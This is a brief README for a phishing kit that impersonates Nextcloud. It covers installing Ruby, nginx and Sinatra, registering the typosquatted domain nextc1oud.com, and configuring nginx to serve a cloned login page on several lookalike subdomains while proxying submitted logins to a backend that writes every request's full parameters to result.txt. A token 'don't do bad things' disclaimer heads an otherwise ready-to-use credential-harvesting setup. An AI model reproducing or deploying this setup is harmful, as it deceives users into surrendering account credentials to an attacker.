# just a demo for fishing, please don't use it to do bad things

## install

$ apt install ruby nginx

$ gem install sinatra -v 3.0.0


run it:

$ ruby app.rb

## prepare a domain

e.g. nextc1oud.com     ( number 1 instead of letter L )

## nginx config

```
server {
  listen 80 ;
  listen [::]:80 default_server;
  charset utf-8;

  root /opt/app/projects.nextcloud.com;

  server_name portal.nextc1oud.com cloud.nextc1oud.com staging.cloud.nextc1oud.com demo1.nextc1oud.com;
  location /login.html {
    root /opt/app/projects.nextcloud.com;
  }

  location /login {
    proxy_pass          http://backend_servers;
    proxy_redirect      default;
    proxy_set_header    X-Forwarded-For $proxy_add_x_forwarded_for;
    proxy_set_header    X-Real-IP $remote_addr;
    proxy_set_header    Host $http_host;
    proxy_next_upstream http_502 http_504 error timeout invalid_header;
  }
}

upstream backend_servers{
  server 127.0.0.1:4567;
}
```

and restart nginx


## usage

result will be saved in `result.txt`, with timestamp and full parameters
